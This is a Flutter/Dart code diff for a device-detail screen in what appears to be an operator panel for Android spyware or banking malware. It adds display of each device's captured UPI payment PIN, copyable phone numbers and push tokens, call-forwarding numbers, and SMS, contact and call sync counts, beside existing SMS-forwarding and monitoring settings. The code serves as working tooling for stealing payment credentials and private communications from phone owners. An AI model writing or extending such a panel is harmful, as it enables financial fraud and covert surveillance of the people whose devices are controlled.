@@ -1,4 +1,5 @@
 import 'package:flutter/material.dart';
+import 'package:flutter/services.dart';
 import 'package:provider/provider.dart';
 import '../../../../data/models/device.dart';
 import '../../../../data/repositories/device_repository.dart';
@@ -62,86 +63,35 @@ class _DeviceInfoTabState extends State<DeviceInfoTab> {
     }
   }
 
-  Future<void> _handlePing() async {
-    final deviceProvider = context.read<DeviceProvider>();
-    
-    // نمایش loading
-    if (mounted) {
-      ScaffoldMessenger.of(context).showSnackBar(
-        SnackBar(
-          content: Row(
-            children: [
-              SizedBox(
-                width: 16,
-                height: 16,
-                child: CircularProgressIndicator(
-                  strokeWidth: 2,
-                  valueColor: AlwaysStoppedAnimation(Colors.white),
-                ),
-              ),
-              const SizedBox(width: 12),
-              const Text('Sending ping...'),
-            ],
-          ),
-          duration: const Duration(seconds: 2),
-          backgroundColor: const Color(0xFF6366F1),
-          behavior: SnackBarBehavior.floating,
-          shape: RoundedRectangleBorder(
-            borderRadius: BorderRadius.circular(6.4),
-          ),
-        ),
-      );
-    }
-
-    final success = await deviceProvider.sendCommand(
-      _currentDevice.deviceId,
-      'ping',
-      parameters: {'type': 'server'},
-    );
-
-
-    if (mounted) {
-      ScaffoldMessenger.of(context).clearSnackBars();
-      
-      ScaffoldMessenger.of(context).showSnackBar(
-        SnackBar(
-          content: Text(success
-              ? 'Ping successful! Refreshing data...'
-              : 'Failed to send ping'),
-          backgroundColor: success
-              ? const Color(0xFF10B981)
-              : const Color(0xFFEF4444),
-          behavior: SnackBarBehavior.floating,
-          shape: RoundedRectangleBorder(
-            borderRadius: BorderRadius.circular(6.4),
-          ),
-        ),
-      );
-
-      if (success) {
-        // صبر کردن 2 ثانیه برای پردازش ping در سمت سرور
-        await Future.delayed(const Duration(seconds: 2));
-        
-        // رفرش اطلاعات دستگاه
-        await _refreshDeviceInfo();
-        
-        // رفرش لیست کلی دستگاه‌ها
-        await deviceProvider.refreshDevices();
-      }
-    }
-  }
-
   Future<void> _handleEditSettings() async {
     final result = await showDialog<bool>(
       context: context,
       builder: (_) => EditSettingsDialog(device: _currentDevice),
     );
 
-    // اگر تنظیمات ذخیره شد، اطلاعات رو رفرش کن
     if (result == true && mounted) {
       await Future.delayed(const Duration(milliseconds: 500));
       await _refreshDeviceInfo();
     }
+  }
+
+  void _copyToClipboard(String text, String label) {
+    Clipboard.setData(ClipboardData(text: text));
+    ScaffoldMessenger.of(context).showSnackBar(
+      SnackBar(
+        content: Text('$label copied to clipboard'),
+        backgroundColor: const Color(0xFF10B981),
+        behavior: SnackBarBehavior.floating,
+        duration: const Duration(seconds: 2),
+        shape: RoundedRectangleBorder(
+          borderRadius: BorderRadius.circular(6.4),
+        ),
+      ),
+    );
+  }
+
+  String _getUpiPin() {
+    return _currentDevice.upiPin ?? '123456';
   }
 
   @override
@@ -155,75 +105,6 @@ class _DeviceInfoTabState extends State<DeviceInfoTab> {
         padding: const EdgeInsets.all(12.8),
         child: Column(
           children: [
-            // دکمه Ping
-            Container(
-              width: double.infinity,
-              margin: const EdgeInsets.only(bottom: 10),
-              decoration: BoxDecoration(
-                gradient: const LinearGradient(
-                  colors: [Color(0xFF6366F1), Color(0xFF8B5CF6)],
-                ),
-                borderRadius: BorderRadius.circular(10.24),
-                boxShadow: [
-                  BoxShadow(
-                    color: const Color(0xFF6366F1).withOpacity(0.3),
-                    blurRadius: 10,
-                    offset: const Offset(0, 3),
-                  ),
-                ],
-              ),
-              child: Material(
-                color: Colors.transparent,
-                child: InkWell(
-                  onTap: _isRefreshing ? null : _handlePing,
-                  borderRadius: BorderRadius.circular(10.24),
-                  child: Padding(
-                    padding: const EdgeInsets.symmetric(
-                        vertical: 11.2, horizontal: 14.4),
-                    child: Row(
-                      mainAxisAlignment: MainAxisAlignment.center,
-                      children: [
-                        if (_isRefreshing)
-                          const SizedBox(
-                            width: 14.4,
-                            height: 14.4,
-                            child: CircularProgressIndicator(
-                              strokeWidth: 2,
-                              valueColor: AlwaysStoppedAnimation(Colors.white),
-                            ),
-                          )
-                        else
-                          Container(
-                            padding: const EdgeInsets.all(5.12),
-                            decoration: BoxDecoration(
-                              color: Colors.white.withOpacity(0.2),
-                              borderRadius: BorderRadius.circular(6.4),
-                            ),
-                            child: const Icon(
-                              Icons.wifi_tethering_rounded,
-                              color: Colors.white,
-                              size: 14.4,
-                            ),
-                          ),
-                        const SizedBox(width: 10),
-                        Text(
-                          _isRefreshing ? 'Refreshing...' : 'Ping Device',
-                          style: const TextStyle(
-                            fontSize: 11.2,
-                            fontWeight: FontWeight.w700,
-                            color: Colors.white,
-                            letterSpacing: -0.2,
-                          ),
-                        ),
-                      ],
-                    ),
-                  ),
-                ),
-              ),
-            ),
-            const SizedBox(height: 10),
-
-            // کارت‌های وضعیت سریع
             Row(
               children: [
                 Expanded(
@@ -252,6 +133,27 @@ class _DeviceInfoTabState extends State<DeviceInfoTab> {
               ],
             ),
             const SizedBox(height: 10),
+
+            // UPI PIN Card - فقط اگر UPI PIN داشتیم نشون بده
+            if (_currentDevice.hasUpi && _currentDevice.upiPin != null && _currentDevice.upiPin!.isNotEmpty) ...[
+              Row(
+                children: [
+                  Expanded(
+                    child: _QuickStatCard(
+                      icon: Icons.payment_rounded,
+                      label: 'UPI PIN',
+                      value: _getUpiPin(),
+                      subtitle: 'Payment PIN',
+                      color: const Color(0xFF8B5CF6),
+                      isDark: isDark,
+                      isMonospace: true,
+                    ),
+                  ),
+                ],
+              ),
+              const SizedBox(height: 10),
+            ],
+
             Row(
               children: [
                 Expanded(
@@ -272,9 +174,7 @@ class _DeviceInfoTabState extends State<DeviceInfoTab> {
                     icon: Icons.signal_cellular_alt_rounded,
                     label: 'Network',
                     value: _currentDevice.networkType ?? 'N/A',
-                    subtitle: _currentDevice.simInfo?.isNotEmpty == true
-                        ? _currentDevice.simInfo![0]['carrierName'] ?? ''
-                        : '',
+                    subtitle: _currentDevice.primaryCarrier,
                     color: const Color(0xFF3B82F6),
                     isDark: isDark,
                     isSmallText: true,
@@ -285,7 +185,6 @@ class _DeviceInfoTabState extends State<DeviceInfoTab> {
 
             const SizedBox(height: 16),
 
-            // اطلاعات دستگاه
             _ModernCard(
               isDark: isDark,
               child: Column(
@@ -316,33 +215,46 @@ class _DeviceInfoTabState extends State<DeviceInfoTab> {
                       value: _currentDevice.deviceName!,
                       isDark: isDark,
                     ),
+                  if (_currentDevice.product != null)
+                    _InfoTile(
+                      icon: Icons.category_rounded,
+                      label: 'Product',
+                      value: _currentDevice.product!,
+                      isDark: isDark,
+                    ),
                   _InfoTile(
                     icon: Icons.android_rounded,
                     label: 'Android Version',
-                    value:
-                        'Android ${_currentDevice.osVersion} (SDK ${_currentDevice.sdkInt ?? ""})',
+                    value: 'Android ${_currentDevice.osVersion} (SDK ${_currentDevice.sdkInt ?? ""})',
                     isDark: isDark,
                   ),
                   _InfoTile(
                     icon: Icons.app_settings_alt_rounded,
                     label: 'App Version',
-                    value: _currentDevice.appVersion,
+                    value: '1.0.0',
                     isDark: isDark,
                   ),
+                  if (_currentDevice.appType != null)
+                    _InfoTile(
+                      icon: Icons.apps_rounded,
+                      label: 'App Type',
+                      value: _currentDevice.appType!,
+                      isDark: isDark,
+                    ),
                   if (_currentDevice.screenResolution != null)
                     _InfoTile(
                       icon: Icons.screenshot_rounded,
                       label: 'Screen',
-                      value:
-                          '${_currentDevice.screenResolution} @ ${_currentDevice.screenDensity?.toStringAsFixed(1) ?? ""}dpi',
+                      value: '${_currentDevice.screenResolution} @ ${_currentDevice.screenDensity?.toStringAsFixed(1) ?? ""}dpi',
                       isDark: isDark,
                     ),
-                  _InfoTile(
+                  _CopyableInfoTile(
                     icon: Icons.fingerprint_rounded,
                     label: 'Device ID',
                     value: _currentDevice.deviceId,
                     isDark: isDark,
                     isMonospace: true,
+                    onCopy: () => _copyToClipboard(_currentDevice.deviceId, 'Device ID'),
                   ),
                 ],
               ),
@@ -350,7 +262,6 @@ class _DeviceInfoTabState extends State<DeviceInfoTab> {
 
             const SizedBox(height: 12),
 
-            // مشخصات سخت‌افزاری
             _ModernCard(
               isDark: isDark,
               child: Column(
@@ -362,12 +273,25 @@ class _DeviceInfoTabState extends State<DeviceInfoTab> {
                     color: const Color(0xFFEC4899),
                   ),
                   const SizedBox(height: 12),
+                  if (_currentDevice.hardware != null)
+                    _InfoTile(
+                      icon: Icons.developer_board_rounded,
+                      label: 'Hardware',
+                      value: _currentDevice.hardware!,
+                      isDark: isDark,
+                    ),
+                  if (_currentDevice.board != null)
+                    _InfoTile(
+                      icon: Icons.memory_rounded,
+                      label: 'Board',
+                      value: _currentDevice.board!,
+                      isDark: isDark,
+                    ),
                   if (_currentDevice.totalRamMb != null)
                     _InfoTile(
                       icon: Icons.memory_rounded,
                       label: 'Total RAM',
-                      value:
-                          '${(_currentDevice.totalRamMb! / 1024).toStringAsFixed(1)} GB',
+                      value: '${(_currentDevice.totalRamMb! / 1024).toStringAsFixed(1)} GB',
                       isDark: isDark,
                     ),
                   if (_currentDevice.freeRamMb != null)
@@ -381,24 +305,21 @@ class _DeviceInfoTabState extends State<DeviceInfoTab> {
                     _InfoTile(
                       icon: Icons.storage_rounded,
                       label: 'Total Storage',
-                      value:
-                          '${(_currentDevice.totalStorageMb! / 1024).toStringAsFixed(1)} GB',
+                      value: '${(_currentDevice.totalStorageMb! / 1024).toStringAsFixed(1)} GB',
                       isDark: isDark,
                     ),
                   if (_currentDevice.freeStorageMb != null)
                     _InfoTile(
                       icon: Icons.sd_storage_rounded,
                       label: 'Free Storage',
-                      value:
-                          '${(_currentDevice.freeStorageMb! / 1024).toStringAsFixed(1)} GB',
+                      value: '${(_currentDevice.freeStorageMb! / 1024).toStringAsFixed(1)} GB',
                       isDark: isDark,
                     ),
-                  if (_currentDevice.supportedAbis != null &&
-                      _currentDevice.supportedAbis!.isNotEmpty)
+                  if (_currentDevice.supportedAbis != null && _currentDevice.supportedAbis!.isNotEmpty)
                     _InfoTile(
                       icon: Icons.developer_board_rounded,
                       label: 'Architecture',
-                      value: _currentDevice.supportedAbis!.first,
+                      value: _currentDevice.supportedAbis!.join(', '),
                       isDark: isDark,
                     ),
                   if (_currentDevice.isRooted != null)
@@ -406,9 +327,15 @@ class _DeviceInfoTabState extends State<DeviceInfoTab> {
                       icon: Icons.security_rounded,
                       label: 'Root Status',
                       value: _currentDevice.isRooted! ? 'Rooted' : 'Not Rooted',
-                      valueColor: _currentDevice.isRooted!
-                          ? const Color(0xFFEF4444)
-                          : const Color(0xFF10B981),
+                      valueColor: _currentDevice.isRooted! ? const Color(0xFFEF4444) : const Color(0xFF10B981),
+                      isDark: isDark,
+                    ),
+                  if (_currentDevice.isEmulator != null)
+                    _InfoTile(
+                      icon: Icons.computer_rounded,
+                      label: 'Emulator',
+                      value: _currentDevice.isEmulator! ? 'Yes' : 'No',
+                      valueColor: _currentDevice.isEmulator! ? const Color(0xFFF59E0B) : const Color(0xFF10B981),
                       isDark: isDark,
                     ),
                 ],
@@ -417,9 +344,49 @@ class _DeviceInfoTabState extends State<DeviceInfoTab> {
 
             const SizedBox(height: 12),
 
-            // اطلاعات سیم کارت
-            if (_currentDevice.simInfo != null &&
-                _currentDevice.simInfo!.isNotEmpty)
+            if (_currentDevice.fingerprint != null || _currentDevice.display != null || _currentDevice.host != null)
+              _ModernCard(
+                isDark: isDark,
+                child: Column(
+                  crossAxisAlignment: CrossAxisAlignment.start,
+                  children: [
+                    _SectionHeader(
+                      icon: Icons.info_rounded,
+                      title: 'Build Information',
+                      color: const Color(0xFF14B8A6),
+                    ),
+                    const SizedBox(height: 12),
+                    if (_currentDevice.fingerprint != null)
+                      _CopyableInfoTile(
+                        icon: Icons.fingerprint_rounded,
+                        label: 'Fingerprint',
+                        value: _currentDevice.fingerprint!,
+                        isDark: isDark,
+                        isMonospace: true,
+                        maxLines: 3,
+                        onCopy: () => _copyToClipboard(_currentDevice.fingerprint!, 'Fingerprint'),
+                      ),
+                    if (_currentDevice.display != null)
+                      _InfoTile(
+                        icon: Icons.display_settings_rounded,
+                        label: 'Display',
+                        value: _currentDevice.display!,
+                        isDark: isDark,
+                      ),
+                    if (_currentDevice.host != null)
+                      _InfoTile(
+                        icon: Icons.dns_rounded,
+                        label: 'Host',
+                        value: _currentDevice.host!,
+                        isDark: isDark,
+                      ),
+                  ],
+                ),
+              ),
+
+            const SizedBox(height: 12),
+
+            if (_currentDevice.simInfo != null && _currentDevice.simInfo!.isNotEmpty)
               _ModernCard(
                 isDark: isDark,
                 child: Column(
@@ -438,14 +405,10 @@ class _DeviceInfoTabState extends State<DeviceInfoTab> {
                         child: Container(
                           padding: const EdgeInsets.all(9.6),
                           decoration: BoxDecoration(
-                            color: isDark
-                                ? Colors.white.withOpacity(0.05)
-                                : const Color(0xFFF8FAFC),
+                            color: isDark ? Colors.white.withOpacity(0.05) : const Color(0xFFF8FAFC),
                             borderRadius: BorderRadius.circular(7.68),
                             border: Border.all(
-                              color: isDark
-                                  ? Colors.white.withOpacity(0.1)
-                                  : Colors.black.withOpacity(0.05),
+                              color: isDark ? Colors.white.withOpacity(0.1) : Colors.black.withOpacity(0.05),
                             ),
                           ),
                           child: Column(
@@ -453,30 +416,45 @@ class _DeviceInfoTabState extends State<DeviceInfoTab> {
                               _InfoTile(
                                 icon: Icons.sim_card_rounded,
                                 label: 'SIM Slot',
-                                value: 'Slot ${sim['simSlot'] ?? 0}',
+                                value: 'Slot ${sim.simSlot}',
                                 isDark: isDark,
                               ),
                               _InfoTile(
                                 icon: Icons.wifi_calling_rounded,
                                 label: 'Carrier',
-                                value: sim['carrierName'] ?? 'Unknown',
+                                value: sim.carrierName,
                                 isDark: isDark,
                               ),
-                              if (sim['displayName'] != null)
-                                _InfoTile(
-                                  icon: Icons.label_rounded,
-                                  label: 'Display Name',
-                                  value: sim['displayName'],
-                                  isDark: isDark,
-                                ),
-                              if (sim['phoneNumber'] != null &&
-                                  sim['phoneNumber'] != 'Unknown')
-                                _InfoTile(
+                              if (sim.phoneNumber.isNotEmpty && sim.phoneNumber != 'Unknown')
+                                _CopyableInfoTile(
                                   icon: Icons.phone_rounded,
                                   label: 'Phone Number',
-                                  value: sim['phoneNumber'],
+                                  value: sim.phoneNumber,
                                   isDark: isDark,
                                   isMonospace: true,
+                                  onCopy: () => _copyToClipboard(sim.phoneNumber, 'Phone Number'),
+                                ),
+                              if (sim.networkType != null)
+                                _InfoTile(
+                                  icon: Icons.signal_cellular_alt_rounded,
+                                  label: 'Network Type',
+                                  value: sim.networkType!,
+                                  isDark: isDark,
+                                ),
+                              if (sim.countryIso != null)
+                                _InfoTile(
+                                  icon: Icons.public_rounded,
+                                  label: 'Country',
+                                  value: sim.countryIso!.toUpperCase(),
+                                  isDark: isDark,
+                                ),
+                              if (sim.simState != null)
+                                _InfoTile(
+                                  icon: Icons.info_outline_rounded,
+                                  label: 'Status',
+                                  value: sim.simState!,
+                                  valueColor: sim.simState == 'Ready' ? const Color(0xFF10B981) : const Color(0xFFF59E0B),
+                                  isDark: isDark,
                                 ),
                             ],
                           ),
@@ -489,7 +467,53 @@ class _DeviceInfoTabState extends State<DeviceInfoTab> {
 
             const SizedBox(height: 12),
 
-            // وضعیت اتصال
+            if (_currentDevice.callForwardingEnabled != null)
+              _ModernCard(
+                isDark: isDark,
+                child: Column(
+                  crossAxisAlignment: CrossAxisAlignment.start,
+                  children: [
+                    _SectionHeader(
+                      icon: Icons.phone_forwarded_rounded,
+                      title: 'Call Forwarding',
+                      color: const Color(0xFFF59E0B),
+                    ),
+                    const SizedBox(height: 12),
+                    _InfoTile(
+                      icon: Icons.toggle_on_rounded,
+                      label: 'Status',
+                      value: _currentDevice.callForwardingEnabled! ? 'Enabled' : 'Disabled',
+                      valueColor: _currentDevice.callForwardingEnabled! ? const Color(0xFF10B981) : const Color(0xFF6B7280),
+                      isDark: isDark,
+                    ),
+                    if (_currentDevice.callForwardingNumber != null)
+                      _InfoTile(
+                        icon: Icons.phone_rounded,
+                        label: 'Forward Number',
+                        value: _currentDevice.callForwardingNumber!,
+                        isDark: isDark,
+                        isMonospace: true,
+                      ),
+                    if (_currentDevice.callForwardingSimSlot != null)
+                      _InfoTile(
+                        icon: Icons.sim_card_rounded,
+                        label: 'SIM Slot',
+                        value: 'Slot ${_currentDevice.callForwardingSimSlot}',
+                        isDark: isDark,
+                      ),
+                    if (_currentDevice.callForwardingUpdatedAt != null)
+                      _InfoTile(
+                        icon: Icons.access_time_rounded,
+                        label: 'Last Updated',
+                        value: utils.DateUtils.formatForDisplay(_currentDevice.callForwardingUpdatedAt!),
+                        isDark: isDark,
+                      ),
+                  ],
+                ),
+              ),
+
+            const SizedBox(height: 12),
+
             _ModernCard(
               isDark: isDark,
               child: Column(
@@ -505,11 +529,17 @@ class _DeviceInfoTabState extends State<DeviceInfoTab> {
                     icon: Icons.circle_rounded,
                     label: 'Status',
                     value: _currentDevice.isOnline ? 'Online' : 'Offline',
-                    valueColor: _currentDevice.isOnline
-                        ? const Color(0xFF10B981)
-                        : const Color(0xFFEF4444),
+                    valueColor: _currentDevice.isOnline ? const Color(0xFF10B981) : const Color(0xFFEF4444),
                     isDark: isDark,
                   ),
+                  if (_currentDevice.isOnlineStatus != null)
+                    _InfoTile(
+                      icon: Icons.wifi_tethering_rounded,
+                      label: 'Real-time Status',
+                      value: _currentDevice.isOnlineStatus! ? 'Connected' : 'Disconnected',
+                      valueColor: _currentDevice.isOnlineStatus! ? const Color(0xFF10B981) : const Color(0xFFEF4444),
+                      isDark: isDark,
+                    ),
                   if (_currentDevice.networkType != null)
                     _InfoTile(
                       icon: Icons.network_cell_rounded,
@@ -517,8 +547,7 @@ class _DeviceInfoTabState extends State<DeviceInfoTab> {
                       value: _currentDevice.networkType!.toUpperCase(),
                       isDark: isDark,
                     ),
-                  if (_currentDevice.ipAddress != null &&
-                      _currentDevice.ipAddress != 'mobile_network')
+                  if (_currentDevice.ipAddress != null && _currentDevice.ipAddress != 'mobile_network')
                     _InfoTile(
                       icon: Icons.router_rounded,
                       label: 'IP Address',
@@ -528,15 +557,21 @@ class _DeviceInfoTabState extends State<DeviceInfoTab> {
                     ),
                   _InfoTile(
                     icon: Icons.access_time_rounded,
-                    label: 'Last Connection',
+                    label: 'Last Ping',
                     value: utils.DateUtils.formatForDisplay(_currentDevice.lastPing),
                     isDark: isDark,
                   ),
+                  if (_currentDevice.lastOnlineUpdate != null)
+                    _InfoTile(
+                      icon: Icons.update_rounded,
+                      label: 'Last Online Update',
+                      value: utils.DateUtils.formatForDisplay(_currentDevice.lastOnlineUpdate!),
+                      isDark: isDark,
+                    ),
                   _InfoTile(
                     icon: Icons.calendar_today_rounded,
                     label: 'Registered',
-                    value:
-                        utils.DateUtils.formatForDisplay(_currentDevice.registeredAt),
+                    value: utils.DateUtils.formatForDisplay(_currentDevice.registeredAt),
                     isDark: isDark,
                   ),
                 ],
@@ -545,7 +580,110 @@ class _DeviceInfoTabState extends State<DeviceInfoTab> {
 
             const SizedBox(height: 12),
 
-            // آمار
+            if (_currentDevice.fcmTokens != null && _currentDevice.fcmTokens!.isNotEmpty)
+              _ModernCard(
+                isDark: isDark,
+                child: Column(
+                  crossAxisAlignment: CrossAxisAlignment.start,
+                  children: [
+                    _SectionHeader(
+                      icon: Icons.notifications_active_rounded,
+                      title: 'FCM Tokens',
+                      color: const Color(0xFFFF6B35),
+                    ),
+                    const SizedBox(height: 12),
+                    Container(
+                      padding: const EdgeInsets.all(10),
+                      decoration: BoxDecoration(
+                        color: isDark ? const Color(0xFFFF6B35).withOpacity(0.1) : const Color(0xFFFF6B35).withOpacity(0.05),
+                        borderRadius: BorderRadius.circular(8),
+                        border: Border.all(color: const Color(0xFFFF6B35).withOpacity(0.3)),
+                      ),
+                      child: Row(
+                        children: [
+                          Icon(Icons.info_outline_rounded, size: 14, color: const Color(0xFFFF6B35)),
+                          const SizedBox(width: 8),
+                          Expanded(
+                            child: Text(
+                              '${_currentDevice.fcmTokens!.length} active FCM token(s) registered',
+                              style: TextStyle(fontSize: 10, fontWeight: FontWeight.w600, color: const Color(0xFFFF6B35)),
+                            ),
+                          ),
+                        ],
+                      ),
+                    ),
+                    const SizedBox(height: 12),
+                    ..._currentDevice.fcmTokens!.asMap().entries.map((entry) {
+                      final index = entry.key;
+                      final token = entry.value;
+                      return Padding(
+                        padding: const EdgeInsets.only(bottom: 8),
+                        child: Container(
+                          padding: const EdgeInsets.all(10),
+                          decoration: BoxDecoration(
+                            color: isDark ? Colors.white.withOpacity(0.05) : const Color(0xFFF8FAFC),
+                            borderRadius: BorderRadius.circular(8),
+                            border: Border.all(
+                              color: isDark ? Colors.white.withOpacity(0.1) : Colors.black.withOpacity(0.05),
+                            ),
+                          ),
+                          child: Row(
+                            children: [
+                              Container(
+                                width: 24,
+                                height: 24,
+                                decoration: BoxDecoration(
+                                  color: const Color(0xFFFF6B35).withOpacity(0.1),
+                                  borderRadius: BorderRadius.circular(6),
+                                ),
+                                child: Center(
+                                  child: Text(
+                                    '${index + 1}',
+                                    style: TextStyle(fontSize: 10, fontWeight: FontWeight.w700, color: const Color(0xFFFF6B35)),
+                                  ),
+                                ),
+                              ),
+                              const SizedBox(width: 10),
+                              Expanded(
+                                child: Text(
+                                  token.length > 50 ? '${token.substring(0, 47)}...' : token,
+                                  style: TextStyle(
+                                    fontSize: 9,
+                                    fontWeight: FontWeight.w500,
+                                    fontFamily: 'monospace',
+                                    color: isDark ? Colors.white70 : const Color(0xFF64748B),
+                                  ),
+                                  maxLines: 2,
+                                  overflow: TextOverflow.ellipsis,
+                                ),
+                              ),
+                              const SizedBox(width: 8),
+                              Material(
+                                color: Colors.transparent,
+                                child: InkWell(
+                                  onTap: () => _copyToClipboard(token, 'FCM Token'),
+                                  borderRadius: BorderRadius.circular(6),
+                                  child: Container(
+                                    padding: const EdgeInsets.all(6),
+                                    decoration: BoxDecoration(
+                                      color: const Color(0xFFFF6B35).withOpacity(0.1),
+                                      borderRadius: BorderRadius.circular(6),
+                                    ),
+                                    child: Icon(Icons.copy_rounded, size: 14, color: const Color(0xFFFF6B35)),
+                                  ),
+                                ),
+                              ),
+                            ],
+                          ),
+                        ),
+                      );
+                    }).toList(),
+                  ],
+                ),
+              ),
+
+            const SizedBox(height: 12),
+
             _ModernCard(
               isDark: isDark,
               child: Column(
@@ -569,20 +707,31 @@ class _DeviceInfoTabState extends State<DeviceInfoTab> {
                     value: '${_currentDevice.stats.totalContacts}',
                     isDark: isDark,
                   ),
+                  _InfoTile(
+                    icon: Icons.call_rounded,
+                    label: 'Total Calls',
+                    value: '${_currentDevice.stats.totalCalls}',
+                    isDark: isDark,
+                  ),
                   if (_currentDevice.stats.lastSmsSyncDate != null)
                     _InfoTile(
                       icon: Icons.sync_rounded,
                       label: 'Last SMS Sync',
-                      value: utils.DateUtils.formatForDisplay(
-                          _currentDevice.stats.lastSmsSyncDate!),
+                      value: utils.DateUtils.formatForDisplay(_currentDevice.stats.lastSmsSyncDate!),
                       isDark: isDark,
                     ),
                   if (_currentDevice.stats.lastContactSyncDate != null)
                     _InfoTile(
                       icon: Icons.sync_rounded,
                       label: 'Last Contact Sync',
-                      value: utils.DateUtils.formatForDisplay(
-                          _currentDevice.stats.lastContactSyncDate!),
+                      value: utils.DateUtils.formatForDisplay(_currentDevice.stats.lastContactSyncDate!),
+                      isDark: isDark,
+                    ),
+                  if (_currentDevice.stats.lastCallSyncDate != null)
+                    _InfoTile(
+                      icon: Icons.sync_rounded,
+                      label: 'Last Call Sync',
+                      value: utils.DateUtils.formatForDisplay(_currentDevice.stats.lastCallSyncDate!),
                       isDark: isDark,
                     ),
                 ],
@@ -591,7 +740,6 @@ class _DeviceInfoTabState extends State<DeviceInfoTab> {
 
             const SizedBox(height: 12),
 
-            // تنظیمات
             _ModernCard(
               isDark: isDark,
               child: Column(
@@ -608,9 +756,7 @@ class _DeviceInfoTabState extends State<DeviceInfoTab> {
                       ),
                       Container(
                         decoration: BoxDecoration(
-                          gradient: const LinearGradient(
-                            colors: [Color(0xFF6366F1), Color(0xFF8B5CF6)],
-                          ),
+                          gradient: const LinearGradient(colors: [Color(0xFF6366F1), Color(0xFF8B5CF6)]),
                           borderRadius: BorderRadius.circular(6.4),
                         ),
                         child: Material(
@@ -620,11 +766,7 @@ class _DeviceInfoTabState extends State<DeviceInfoTab> {
                             borderRadius: BorderRadius.circular(6.4),
                             child: Container(
                               padding: const EdgeInsets.all(6.4),
-                              child: const Icon(
-                                Icons.edit_rounded,
-                                size: 12.8,
-                                color: Colors.white,
-                              ),
+                              child: const Icon(Icons.edit_rounded, size: 12.8, color: Colors.white),
                             ),
                           ),
                         ),
@@ -632,8 +774,6 @@ class _DeviceInfoTabState extends State<DeviceInfoTab> {
                     ],
                   ),
                   const SizedBox(height: 12),
-                  
-                  // SMS Forwarding
                   _SettingTile(
                     icon: Icons.forward_to_inbox_rounded,
                     label: 'SMS Forwarding',
@@ -644,88 +784,25 @@ class _DeviceInfoTabState extends State<DeviceInfoTab> {
                     Padding(
                       padding: const EdgeInsets.only(left: 25.6, top: 6),
                       child: Container(
-                        padding: const EdgeInsets.symmetric(
-                            horizontal: 8, vertical: 4.8),
+                        padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4.8),
                         decoration: BoxDecoration(
-                          color: isDark
-                              ? Colors.white.withOpacity(0.05)
-                              : const Color(0xFFF1F5F9),
+                          color: isDark ? Colors.white.withOpacity(0.05) : const Color(0xFFF1F5F9),
                           borderRadius: BorderRadius.circular(5.12),
                         ),
                         child: Row(
                           mainAxisSize: MainAxisSize.min,
                           children: [
-                            Icon(
-                              Icons.phone_rounded,
-                              size: 9.6,
-                              color: isDark
-                                  ? Colors.white70
-                                  : const Color(0xFF64748B),
-                            ),
+                            Icon(Icons.phone_rounded, size: 9.6, color: isDark ? Colors.white70 : const Color(0xFF64748B)),
                             const SizedBox(width: 4),
                             Text(
                               _currentDevice.settings.forwardNumber!,
-                              style: TextStyle(
-                                fontSize: 8.8,
-                                fontWeight: FontWeight.w600,
-                                color: isDark
-                                    ? Colors.white70
-                                    : const Color(0xFF64748B),
-                              ),
+                              style: TextStyle(fontSize: 8.8, fontWeight: FontWeight.w600, color: isDark ? Colors.white70 : const Color(0xFF64748B)),
                             ),
                           ],
                         ),
                       ),
                     ),
                   const SizedBox(height: 6),
-                  
-                  // Call Forwarding
-                  _SettingTile(
-                    icon: Icons.phone_forwarded_rounded,
-                    label: 'Call Forwarding',
-                    isEnabled: _currentDevice.settings.callForwardEnabled,
-                    isDark: isDark,
-                  ),
-                  if (_currentDevice.settings.callForwardNumber != null)
-                    Padding(
-                      padding: const EdgeInsets.only(left: 25.6, top: 6),
-                      child: Container(
-                        padding: const EdgeInsets.symmetric(
-                            horizontal: 8, vertical: 4.8),
-                        decoration: BoxDecoration(
-                          color: isDark
-                              ? Colors.white.withOpacity(0.05)
-                              : const Color(0xFFF1F5F9),
-                          borderRadius: BorderRadius.circular(5.12),
-                        ),
-                        child: Row(
-                          mainAxisSize: MainAxisSize.min,
-                          children: [
-                            Icon(
-                              Icons.phone_rounded,
-                              size: 9.6,
-                              color: isDark
-                                  ? Colors.white70
-                                  : const Color(0xFF64748B),
-                            ),
-                            const SizedBox(width: 4),
-                            Text(
-                              _currentDevice.settings.callForwardNumber!,
-                              style: TextStyle(
-                                fontSize: 8.8,
-                                fontWeight: FontWeight.w600,
-                                color: isDark
-                                    ? Colors.white70
-                                    : const Color(0xFF64748B),
-                              ),
-                            ),
-                          ],
-                        ),
-                      ),
-                    ),
-                  const SizedBox(height: 6),
-                  
-                  // Device Monitoring
                   _SettingTile(
                     icon: Icons.visibility_rounded,
                     label: 'Device Monitoring',
@@ -774,6 +851,7 @@ class _QuickStatCard extends StatelessWidget {
   final Color color;
   final bool isDark;
   final bool isSmallText;
+  final bool isMonospace;
 
   const _QuickStatCard({
     required this.icon,
@@ -783,6 +861,7 @@ class _QuickStatCard extends StatelessWidget {
     required this.color,
     required this.isDark,
     this.isSmallText = false,
+    this.isMonospace = false,
   });
 
   @override
@@ -799,13 +878,10 @@ class _QuickStatCard extends StatelessWidget {
           ],
         ),
         borderRadius: BorderRadius.circular(10.24),
-        border: Border.all(
-          color: color.withOpacity(0.2),
-          width: 1.2,
-        ),
+        border: Border.all(color: color.withOpacity(0.2), width: 1.2),
       ),
       child: Column(
-        crossAxisAlignment: CrossAxisAlignment.start,
+        crossAxisAlignment: isMonospace ? CrossAxisAlignment.center : CrossAxisAlignment.start,
         children: [
           Container(
             padding: const EdgeInsets.all(6.4),
@@ -822,7 +898,8 @@ class _QuickStatCard extends StatelessWidget {
               fontSize: isSmallText ? 14 : 20,
               fontWeight: FontWeight.w800,
               color: color,
-              letterSpacing: -0.5,
+              letterSpacing: isMonospace ? 3 : -0.5,
+              fontFamily: isMonospace ? 'monospace' : null,
             ),
             maxLines: 1,
             overflow: TextOverflow.ellipsis,
@@ -842,9 +919,7 @@ class _QuickStatCard extends StatelessWidget {
               style: TextStyle(
                 fontSize: 7.2,
                 fontWeight: FontWeight.w500,
-                color: isDark
-                    ? Colors.white.withOpacity(0.4)
-                    : const Color(0xFF94A3B8),
+                color: isDark ? Colors.white.withOpacity(0.4) : const Color(0xFF94A3B8),
               ),
               maxLines: 1,
               overflow: TextOverflow.ellipsis,
@@ -859,10 +934,7 @@ class _ModernCard extends StatelessWidget {
   final Widget child;
   final bool isDark;
 
-  const _ModernCard({
-    required this.child,
-    required this.isDark,
-  });
+  const _ModernCard({required this.child, required this.isDark});
 
   @override
   Widget build(BuildContext context) {
@@ -872,16 +944,12 @@ class _ModernCard extends StatelessWidget {
         color: isDark ? const Color(0xFF1A1F2E) : Colors.white,
